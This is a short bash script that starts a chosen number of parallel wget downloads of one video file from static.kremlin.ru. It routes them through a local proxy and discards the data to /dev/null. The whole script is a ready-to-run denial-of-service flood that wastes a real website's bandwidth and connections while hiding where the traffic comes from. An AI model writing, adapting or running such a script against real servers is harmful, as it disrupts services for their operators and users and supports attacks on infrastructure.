#!/bin/bash
for i in $(seq "$1");
do
  wget http://static.kremlin.ru/media/events/video/ru/video_high/LJmJ5nrjhyCfVNDigS1CHdlmaG15G8cR.mp4 --timeout=3600 -e use_proxy=on -e http_proxy=127.0.0.1:10006 -t 1 --limit-rate=500K -O /dev/null &
done
